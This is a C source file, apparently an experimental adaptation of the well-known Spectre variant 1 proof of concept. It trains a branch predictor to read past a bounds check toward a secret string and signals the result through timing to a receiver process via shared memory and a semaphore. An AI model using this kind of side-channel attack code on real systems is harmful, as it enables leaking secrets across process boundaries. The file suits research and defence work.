#define _GNU_SOURCE
#include <sched.h>
#include <sys/times.h>
#include "cacheutils.h"

#include <time.h>
#include <stdlib.h>
#include <unistd.h>
#include <stddef.h>
#include <errno.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/socket.h>

#define SEM_KEY     100
#define SHM_KEY     101


#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> 
#pragma optimize("gt", on)
#else
#include <x86intrin.h> 
#endif

#ifndef _MSC_VER
#define sscanf_s sscanf
#endif


unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];

// First character is either ‘T’ or ‘a’ to generate send0 and send1
char* secret = "ahe Msadasare Squeamish Ossifrage.";

int num = 0;

typedef struct shared_use {
    int pktlen;
    unsigned char pkt[1528];
} shared_use_t;

union semun

{
int val;

struct semid_ds *buf;

unsigned short *array;

}sem_union;

static int sem_id = 0;
static void *shm = NULL;

static int semaphore_v()
{
    struct sembuf sem_b;

    sem_b.sem_num = 0;
    sem_b.sem_op = 1;
    sem_b.sem_flg = SEM_UNDO;
    if (semop(sem_id, &sem_b, 1) == -1) {
        return -1;
    }

    return 0;
}

static int semaphore_p()
{
    struct sembuf sem_b;

    sem_b.sem_num = 0;
    sem_b.sem_op = -1;
    sem_b.sem_flg = SEM_UNDO;
    if (semop(sem_id, &sem_b, 1) == -1) {
        return -1;
    }

    return 0;
}

static int semaphore_init()
{
    sem_id = semget((key_t)SEM_KEY, 0, 0666 | IPC_CREAT);
    if (sem_id == -1) {
        return -1;
    }


    return 0;
}

static int sharemmy_init(void)
{
    int shmid;

    shmid = shmget((key_t)SHM_KEY, sizeof(shared_use_t), 0666 | IPC_CREAT);
    if (shmid == -1) {
        return shmid;
    }

    shm = shmat(shmid, (void *)0, 0);
    if (shm == (void *)-1) {
        return -1;
    }

    return shmid;
}

static int sharemmy_destroy(int shmid, void *shm)
{
    int rv;

    rv = shmdt(shm);
    if (rv == -1) {
        return rv;
    }

    return 0;
}

void set_cpu(int id);

void victim_function(size_t x)
{
	
	if (x < array1_size)
	{
		// changed in Source.s, lines 557 to 576, >90 is a, <90 is T
		if (array1[x] > 90) {
			for(num = 0; num < 100; num++) {
				
			}
		} else {
			for(num = 0; num < 100; num++) {
				
			}
		}
	}
	
	
}

void readMemoryByte(size_t malicious_x, uint8_t value[2])
{
	int tries, i, j;
	size_t training_x, x;
	register uint64_t time1, time2;
	u_int64_t t[1000000];
	shared_use_t *shared;
	
	// Synchronization with the receiver
	t[0]=rdtsc();
        shared = (shared_use_t *)shm;
        shared->pktlen = sizeof(t[0]);
        memcpy(shared->pkt, t, sizeof(t[0]));
        semaphore_v();

	for (tries = 40000; tries > 0; tries--)
	{
		t[0] += 20000;

		training_x = tries % array1_size;
		time1 = rdtsc();
		while (time1 < t[0]) time1 = rdtsc();
		
		// Train and trigger misprediction
		for (j = 5; j >= 0; j--)
		{
			_mm_clflush(&array1_size);


			x = ((j % 6) - 1) & ~0xFFFF; 
			x = (x | (x >> 16)); 
			x = training_x ^ (x & (malicious_x ^ training_x));
			
			victim_function(x);
		}
		// changed in Source.s, lines 706 to 739
		for (j = 100; j >= 0; j--){
			
		}
	}
}

int main(int argc, const char* * argv)
{
	printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
	size_t malicious_x = (size_t)(secret - (char *)array1); 
	uint8_t value[2];
	int shmid, rv;
	
	puts("cpu affinity set");
	// pin CPU
    	set_cpu(0);
    	cpu_set_t get;
	shared_use_t *shared;

    	CPU_ZERO(&get);
    	if (sched_getaffinity(0, sizeof(get), &get) == -1) {
        	printf("get CPU affinity failue, ERROR:%s\n", strerror(errno));
        	return -1;
    	}


	rv = semaphore_init();
    	if (rv < 0) {
        	printf("Init a semaphore fail.\n");
        	return 0;
    	}

    	shmid = sharemmy_init();
    	if (shmid == -1) {
        	printf("Init a share memory fail.\n");
        	return 0;
    	
	}

	printf("Reading at malicious_x = %p... \n", (void *)malicious_x);
	printf("target:%d\n", array1[malicious_x]);
	readMemoryByte(malicious_x++, value);
	
#ifdef _MSC_VER
	printf("Press ENTER to exit\n");
	getchar();	/* Pause Windows console */
#endif
	return (0);
}


// setup the cpu set of this program to run on
void set_cpu(int id)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(id, &mask);
    if (sched_setaffinity(0, sizeof(mask), &mask) == -1)
    {
        fprintf(stderr, "warning: could not set CPU affinity/n");
    }
}
